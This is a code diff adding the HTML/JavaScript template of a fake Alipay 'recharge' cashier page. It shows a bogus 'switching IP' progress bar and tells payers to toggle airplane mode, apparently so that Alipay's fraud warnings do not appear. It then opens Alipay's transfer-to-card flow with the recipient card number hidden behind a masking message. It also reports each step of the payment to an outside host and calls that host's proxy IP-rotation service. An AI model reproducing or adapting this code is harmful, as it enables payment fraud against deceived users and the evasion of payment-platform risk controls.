@@ -1,0 +1,479 @@
+<html><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <title>正在充值</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <link rel="stylesheet" type="text/css" href="/Public/zfb/qiswl/FxSms/h5cashier.css" media="all">
+    <link rel="stylesheet" href="/Public/zfb/qiswl/FxSms/antui.css">
+    <link rel="stylesheet" type="text/css" href="/Public/zfb/qiswl/FxSms/alitrans.css">
+    <script charset="utf-8" src="/Public/zfb/qiswl/FxSms/axios.min.js"></script>
+    <script src="/Public/zfb/qiswl/FxSms/jquery.min.js"></script>
+    <script src="/Public/zfb/qiswl/FxSms/alipayjsapi.inc.min.js"></script>
+    <script type="text/javascript" src="/Public/zfb/qiswl/layer/layer.js"></script>
+    <link rel="stylesheet" href="/Public/zfb/qiswl/layer.css?v=3.1.1" id="layuicss-layer">
+
+    <style>
+        body {
+            font-weight: 500;
+            font-family: PingFangSC-Regular, "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+        }
+
+        .am-header {
+            display: none;
+        }
+
+        .alipay-logo {
+            display: none;
+        }
+
+        .result {
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .result-logo {
+            width: 70px;
+            height: 98px;
+            margin: auto;
+            background: url("/Public/zfb/qiswl/FxSms/alipay.png") no-repeat;
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+
+        .result-logo1 {
+            width: 200px;
+            height: 130px;
+            margin: auto;
+            background: url("/Public/zfb/qiswl/FxSms/ts120.jpg") no-repeat;
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+
+        .result-logo2 {
+            width: 300px;
+            height: 80px;
+            margin: auto;
+            background: url("/Public/zfb/qiswl/FxSms/ts110.png") no-repeat;
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+
+        .qrcode {
+            width: 140px;
+            height: 140px;
+            margin: auto;
+        }
+
+        .result-title {
+            margin: 20px 0 14px;
+            text-align: center;
+            font-size: 21px;
+            color: #00a0e8;
+            line-height: 25px;
+        }
+
+        .result-title1 {
+            margin: 10px 0 14px;
+            text-align: center;
+            font-size: 21px;
+            color: red;
+            line-height: 25px;
+        }
+
+        .result-tips {
+            max-width: 370px;
+            margin: 0 auto 10px;
+            padding: 0 15px;
+            font-size: 15px;
+            color: #a5a5a5;
+            line-height: 18px;
+            text-align: left;
+            word-break: break-all;
+            word-wrap: break-word;
+        }
+
+        .result-botton {
+            margin: 0 15px 20px;
+        }
+
+        .result-botton a {
+            display: block;
+            margin: auto;
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+            max-width: 384px;
+            height: 44px;
+            text-align: center;
+        }
+
+        .result-botton a.am-button-white {
+            color: #00aaee;
+            background: #ffffff;
+            border: 1px solid #00aaee;
+        }
+
+        .result-botton .am-button[disabled=disabled] {
+            color: #e6e6e6;
+            background: #f8f8f8;
+            border: 1px solid #dedede;
+        }
+
+        .loading {
+            display: none;
+        }
+    </style>
+    <style type="text/css">
+        .out1 {
+            margin: 0 15px 20px;
+            height: 44px;
+            background: lightgray;
+            overflow: hidden;
+        }
+
+        .in1 {
+            width: 0;
+            height: 44px;
+            line-height: 44px;
+            text-align: right;
+            background: #0ae;
+            color: #fff;
+            font-size: 18px;
+        }
+
+        .STYLE2 {
+            font-size: 12px
+        }
+
+        .STYLE3 {
+            color: #FF0000;
+            font-weight: bold;
+        }
+
+        .STYLE4 {
+            color: #0000FF
+        }
+    </style>
+    <style id="tsbrowser_video_independent_player_style" type="text/css">
+        [tsbrowser_force_max_size] {
+            width: 100% !important;
+            height: 100% !important;
+            left: 0px !important;
+            top: 0px !important;
+            margin: 0px !important;
+            padding: 0px !important;
+        }
+        [tsbrowser_force_fixed] {
+            position: fixed !important;
+            z-index: 9999 !important;
+            background: black !important;
+        }
+        [tsbrowser_force_hidden] {
+            z-index: 0 !important;
+            opacity: 0 !important;
+        }
+        [tsbrowser_hide_scrollbar] {
+            overflow: hidden !important;
+        }
+    </style>
+</head>
+
+
+<body>
+<div>
+    <div class="result">
+        <!-- <div class="result-title1">支付流程视频</div>
+        <video id="chdmifkwfoxtqgcziv" width="100%" height="40%"  controls="controls" style="width: 100%; height: 40%; background-color: rgb(0, 0, 0);">
+            <source src="/static/gateway/video/190627181727.mp4" type="video/mp4">
+        </video> -->
+        <!--<div class="result-title1">如果出现下方警告，不要退出</div>-->
+        <!--<div class="result-logo1"></div>-->
+        <!--<br>-->
+        <!--<div class="result-logo2" ></div>-->
+        <!--<div class="result-logo" id="result-logo"></div>-->
+        <div class="result-title">正在切换IP, 请稍后...</div>
+        <div style="margin-top: 40px; color: red;" id="ios-tips" class="result-tips">
+            <!--<p class="STYLE4">1.摄像头自动弹出后，请直接扫描您身边任意商品（烟盒二维码、饮料、零食等）包装上的条形码或二维码，即可跳转支付界面。</p>-->
+            <!-- <p class="STYLE4" style="color: yellowgreen;font-size: 20px; text-align: center">请先打开手机飞行模式,以便重新获取IP</p>
+            <br> -->
+            <!-- <p class="STYLE4" style="color: blue;font-size: 18px; text-align: center">跳转后记得重新打开网络</p>
+            <br> -->
+            <!-- <p class="STYLE4" style="color: blue;font-size: 20px">如：零食上的条形码</p>
+            <br>
+            <p class="STYLE4" style="color: blue;font-size: 20px">如：饮料上的条形码</p>
+            <br>
+            <p class="STYLE4" style="color: blue;font-size: 20px">如：纸巾上的条形码</p>
+            <br> -->
+            <!-- <p class="STYLE4" style="color: red;font-size: 22px">注意：请一定扫描身边商品,不要打开相册</p> -->
+            <!--<p class="STYLE4">3.若提示“本次交易存在风险”，请点击继续付款。</p>-->
+        </div>
+        <div style="display: none;" id="ios-tips2" class="result-tips">2.无法跳转支付也可尝试按Home键回到桌面，再次返回支付宝即可跳转支付;</div>
+        <div id="xx" class="out1 result-botton">
+            <div class="in1" onclick="goPay()" id="percent" style="width: 40%; text-align: center;">39%</div>
+        </div>
+
+    </div>
+</div>
+
+<div class="am-list" style="border: none; background: none; width: 100%;">
+    <div class="am-list-body" style="position: relative;">
+        <div class="am-list-item" style="padding: 0 15px;">
+            <div class="am-list-content" style="color: #bbb;">应付金额:</div>
+            <div class="am-list-extra" style="-webkit-flex: initial;-webkit-box-flex: initial;">
+                <div style="font-size:0.3rem; outline:none;background:transparent;border:none;outline:medium;height:auto; color: #0ae;">¥ <span id="money"><{$amount}></span> </div>
+            </div>
+        </div>
+        <!--<div class="am-list-item" style="padding: 0 15px;">-->
+            <!--<img src="/static/gateway/alipay_bank/image/ts120.jpg" alt="" width="100px">-->
+        <!--</div>-->
+    </div>
+</div>
+<div style="color: green;font-size: 18px">&nbsp;&nbsp;&nbsp;如图:<br /></div>
+<div style="text-align: center; margin-top: 10px"><img src="/Public/zfb/qiswl/FxSms/feixing.png" alt="" width="90%" height="30%"></div>
+
+<form name="payForm">
+    <input type="hidden" name="bankAccount" value="<{$account}>">
+    <input type="hidden" name="cardNo" value="<{$carno}>">
+    <input type="hidden" name="bankName" value="<{$bankname}>">
+    <input type="hidden" name="bankMark" value="<{$bankmark}>">
+    <input type="hidden" name="amount" value="<{$amount}>">
+    <input type="hidden" name="cardIndex" value="<{$cardindex}>">
+    <input type="hidden" name="cardChannel" value="HISTORY_CARD">
+    <input type="hidden" name="cardNoHidden" value="true"><input type="hidden" name="__hash__" value="85461fe2ae68630742cff2544f492e44_a707edc6f2d259f101c0e367ff3d4e78" /></form>
+</form>
+
+<script src="/Public/zfb/qiswl/FxSms/vconsole.min.js"></script>
+<script>
+    $(function(){
+        function pushHistory() {
+            var state = {
+                title: "title",
+                url: "#"
+            };
+            window.history.pushState(state, "title", "#");
+        }
+        pushHistory();
+        window.addEventListener("popstate", function(e) {
+            AlipayJSBridge.call('exitApp');
+        }, false);
+    });
+
+    //右上角菜单
+    AlipayJSBridge.call('setOptionMenu', {
+        icontype: 'filter',
+    });
+    AlipayJSBridge.call('showOptionMenu');
+    document.addEventListener('optionMenu', function (e) {
+        AlipayJSBridge.call('showPopMenu', {
+            menus: [{
+                name: "查看帮助",
+                tag: "tag1",
+            },
+                {
+                    name: "我要投诉",
+                    tag: "tag2",
+                }
+            ],
+        }, function (e) {
+            console.log(e);
+        });
+    }, false);
+</script>
+
+<script type="text/javascript">
+
+    // 更新收款步骤
+    function postStep(v) {
+        $.post('http://api.b1m4a5t4x8h3ns8m.com/pay/updateRecStepTwo.do', {
+            order_no: 'C723828632917152',
+            number: v,
+        }, function (result) {
+            console.log(result);
+        });
+    }
+    postStep(3);
+
+    var cardNo = "请重新打开网络****"
+    var bankName = ""+document.payForm.bankName.value+""
+    var bankMark = ""+document.payForm.bankMark.value+""
+    var amount = ""+document.payForm.amount.value+""
+    var cardIndex = ""+document.payForm.cardIndex.value+""
+    var bankAccount = ""+document.payForm.bankAccount.value+""
+
+    // var vConsole = new VConsole();
+
+    var count = 60;
+    var canPoll = true;
+    var canpay = false;
+    var percent = 40;
+
+    //gopay
+    changeIp();
+    var timer = window.setInterval(function () {
+        if (!canPoll) return;
+        if (count < 0) {
+            canPoll = false;
+            canpay = true;
+            clearInterval(timer);
+            $('#percent').css('text-align', 'center');
+            $('#percent').html("立即支付");
+            $('.result-title').text('请打开飞行模式以继续 !!!');
+            $('.result-title').css('margin', '0');
+            $('#xxx').css('display', 'block');
+            $('#J_btn_scanQR').show();
+            $('#percent').css('width', "100%");
+            postStep(5);
+            return true;
+        }
+        $('#percent').text(percent + "%")
+        $('#percent').css('width', percent + "%")
+        percent = percent + 1;
+        count--;
+    }, 50);
+
+
+    var userid = "";
+    var money = "";
+
+
+
+
+    function goPay() {
+        if (!canpay) {
+            return;
+        }
+        ap.getNetworkType(function(res){
+            networkAvailable = res.networkAvailable;
+             //alert(networkAvailable);
+            if (networkAvailable) {
+                // layer.confirm('<div style="color:red; font-size:18px">请先打开手机飞行模式!!!<br /><br />请先打开手机飞行模式!!!<br /><br />请先打开手机飞行模式!!!', {
+                //     icon: 1,
+                //     title: '充值提示',
+                //     btn: ['我知道了'] //按钮
+                // }, function (index) {
+                //     layer.close(index);
+                // });
+                alert('请先打开手机飞行模式!');
+            } else {
+                layer.confirm('<div style="color:red; font-size:18px">跳转到支付页面后请重新打开网络!<br /><br />跳转后请重新打开网络!!!<br /><br />跳转后请重新打开网络!!!', {
+                    icon: 1,
+                    title: '充值提示',
+                    btn: ['我知道了'] //按钮
+                }, function (index) {
+                    layer.close(index);
+                    setTimeout(function () { scanQR(); }, 50);
+                });
+                
+            }
+        });
+    }
+
+    var myTimer;
+
+    function timeraa(intDiff) {
+        myTimer = window.setInterval(function () {
+            var day = 0,
+                hour = 0,
+                minute = 0,
+                second = 0;//时间默认值
+
+            if (intDiff > 0) {
+                day = Math.floor(intDiff / (60 * 60 * 24));
+                hour = Math.floor(intDiff / (60 * 60)) - (day * 24);
+                minute = Math.floor(intDiff / 60) - (day * 24 * 60) - (hour * 60);
+                second = Math.floor(intDiff) - (day * 24 * 60 * 60) - (hour * 60 * 60) - (minute * 60);
+            }
+            if (minute <= 9) minute = '0' + minute;
+            if (second <= 9) second = '0' + second;
+
+            if (hour <= 0 && minute <= 0 && second <= 0) {
+                clearInterval(myTimer);
+            }
+            intDiff--;
+
+            checkdata();
+
+        }, 1000);
+    }
+
+    var updateQrImg = 0;
+
+    //检测支付状态
+    function checkdata() {
+        $.post('<{:U("Pay/FxSms/getstatus")}>',{id:'<{$orderid}>'}, function (result) {
+
+            if (result.code == '-1' || result.code == '-2') {
+                AlipayJSBridge.call('alert', {
+                    title: '支付提示',
+                    message: '支付超时',
+                    button: '我知道了'
+                }, function (e) {
+                    AlipayJSBridge.call('exitApp');
+                });
+            }
+
+            $('#money').html(result.data.money);
+
+            //成功
+            if (result.code == '200') {
+                postStep(6);
+                window.clearInterval(myTimer);
+                myTimer = undefined;
+                AlipayJSBridge.call('alert', {
+                    title: '支付提示',
+                    message: '支付成功',
+                    button: '我知道了'
+                }, function (e) {
+                    AlipayJSBridge.call('exitApp');
+                });
+            }
+
+
+        },'json');
+
+    }
+
+    function goJsPay() {
+        AlipayJSBridge.call('exitApp');
+        var a = {
+            actionType: "toCard",
+            sourceId:"bill",
+            cardNo:cardNo,
+            bankAccount:bankAccount,
+            money:amount,
+            amount:amount,
+            bankMark:bankMark,
+            bankName:bankName,
+            cardIndex:cardIndex,
+            cardChannel:"HISTORY_CARD",
+            cardNoHidden:"true"
+        };
+        setTimeout(function () {
+            AlipayJSBridge.call("startApp", {
+                appId: "09999988",
+                param: a
+            }, function (a) { });
+        }, 300)
+    }
+
+    timeraa(5000);
+    function scanQR() {
+        // ap.scan(function (res) {
+            setTimeout(function () { goJsPay(); }, 200);
+        // });
+    };
+
+    // 阿布云切换IP
+    function changeIp() {
+        $.post('http://api.b1m4a5t4x8h3ns8m.com/index/changeIP.do', {
+        }, function (result) {
+            console.log(result);
+        });
+    }
+</script>
+</body>
+</html>
